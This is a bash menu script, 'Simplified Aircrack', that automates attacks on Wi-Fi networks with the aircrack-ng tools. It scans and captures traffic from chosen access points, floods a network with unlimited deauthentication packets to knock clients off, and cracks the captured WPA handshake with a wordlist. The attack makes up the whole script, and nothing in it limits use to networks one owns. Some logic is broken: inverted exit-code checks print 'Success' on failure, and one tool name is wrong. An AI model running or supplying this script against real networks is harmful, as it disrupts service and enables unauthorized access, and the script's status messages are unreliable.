#!/bin/bash
#Simplified Aircrack | Use ROOT
#V3
GREEN="\e[1;32m"
RED="\e[1;31m"
YELLOW="\e[1;33m"
COEND="\e[0m"

start()
{
echo "Start"

}

menu()
{

clear
echo "-------------------------------------------------------"
echo -e "$GREEN ~Simplified Aircrack~ $COEND"
printf "Which operation would you like to run...?\n"
echo -e "$GREEN [1] Start $COEND"
echo -e "$RED [2] Exit $COEND"
echo "-------------------------------------------------------"
date
uptime
read start_menu

case $start_menu in
1)
	echo -e "$GREEN Moving to main menu... $COEND"
	clear
	start

	;;

2)
	echo -e "$RED Shutting Down... $COEND"
	clear
	exit

	;;

*)
	echo -e "$RED Invalid Input, Redirecting... $COEND"
	sleep 1
	menu
	;;
	esac
}

menu

begin()
{
echo -e "$GREEN Loading Menu... $COEND"

}
menu2()
{

clear
echo -e "$YELLOW ############################################### $COEND"
printf "[1] View all surrounding wireless networks\n"
printf "[2] Listen on one CH\n"
printf "[3] Listen on one CH | Write data down\n"
printf "[4] Cracking\n"
echo -e "$RED [5] Exit $COEND"
echo -e "$GREEN ----------------------------------------------------------- $COEND"
read begin_menu2
case $begin_menu2 in
1)
	sleep 1
	airmon-ng start wlan0
	airodump-ng mon0
	if [ $? -eq 0 ]; then
		echo -e "$GREEN [+] Success... $COEND"
	else
		echo -e "$RED [!] Unsuccessful... $COEND"
		read WAIT_FOR_USER
		clear
		menu2
	fi
	read WAIT_FOR_USER
	clear
	menu2

	;;

2)
	sleep 1
	airmon-ng start wlan0
	echo -e "$RED [!] Input CH $COEND"
	read CH
	echo -e "$RED [!] Input BSSID $COEND"
	read BSSID
	echo -e "$RED [!] Input INTERFACE $COEND"
	read INTERFACE
	airodump-ng -c $CH --bssid $BSSID -w dump $INTERFACE
	if [ $? -eq 0 ]; then
		echo -e "$GREEN [+] Success... $COEND"
	else
		echo -e "$RED [!] Unsuccessful... $COEND"
		read WAIT_FOR_USER
		clear
		menu2
	fi
	read WAIT_FOR_USER
	clear
	menu2

	;;

3)
	sleep 1
	echo -e "$RED [!] Input CH $COEND"
	read CH
	echo -e "$RED [!] Input BSSID $COEND"
	read BSSID
	echo -e "$RED [!] INTERFACE $COEND"
	read INTERFACE
	airodump-ng -c $CH --bssid $BSSID -w dump $INTERFACE
	if [ $? -ne 0 ]; then
	    echo -e "$GREEN [+] Data written | Sniff complete $COEND"
	else
	    echo -e "$RED [!] Unsuccessful... $COEND"
		sleep 1
		clear
		menu2
	fi
	read WAIT_FOR_USER
	clear
	menu2

	;;

4)
	sleep 1
	airmon-ng
	airmon-ng start wlan0
	echo -e "$RED [!] Input offending PID Numbers... $COEND"
	echo "-----------------------------------------------------------"
	echo -e "$RED [!] Input PID1 $COEND"
	read PID1
	kill $PID1
	echo "-------------------------"
	echo -e "$RED [!] Input PID2 $COEND"
	read PID2
	kill $PID2
	echo "-------------------------"
	echo -e "$RED [!] Input PID3 $COEND"
	read PID3
	kill $PID3
	echo "-------------------------"
	echo -e "$GREEN [+] All offending PID's have been removed... $COEND"
	echo "-----------------------------------------------------------"
	echo -e "$RED [!] Input CH $COEND"
	read CH
	echo -e "$RED [!] Input BSSID $COEND"
	read BSSID
	echo -e "$RED [!] Input INTERFACE $COEND"
	read INTERFACE
	airodump-ng -c $CH -w defcon --bssid $BSSID $INTERFACE
	echo "-----------------------------------------------------------"
	echo -e "$RED [!] Input BSSID $COEND"
	read BSSID
	echo -e "$RED [!] Input INTERFACE $COEND"
	read INTERFACE
	echo -e "$GREEN Before you do this, open another terminal and listen on the CH $COEND"
	echo -e "$GREEN Press -enter- to continue... $COEND"
	read WAIT_FOR_USER
	aireplay -0 0 -a $BSSID $INTERFACE
	echo -e "$GREEN Open a second terminal doing -ls- and choose your Wordlist and file $COEND"
	echo "-----------------------------------------------------------"
	echo -e "$RED [!] Input Wordlist, example: /root/Desktop/Wordlist $COEND"
	read WORDLIST
	echo -e "$RED [!] Input .cap file where handshake is present $COEND"
	read FILE
	aircrack-ng -w $WORDLIST $FILE
	if [ $? -ne 0 ]; then
	    echo -e "$GREEN [+] Cracking Success... $COEND"
    else
	    echo -e "$RED [!] Unsuccessful... $COEND"
		read WAIT_FOR_USER
		clear
		menu2
	fi
	read WAIT_FOR_USER
	clear
	menu2
	
	;;
	
5)
	echo -e "$RED [!] Shutting down... $COEND"
	clear
	exit

	;;

*)
	echo -e "$RED [!] Invalid Input, Redirecting... $COEND"
	clear
	menu2
	;;
	esac
}

menu2
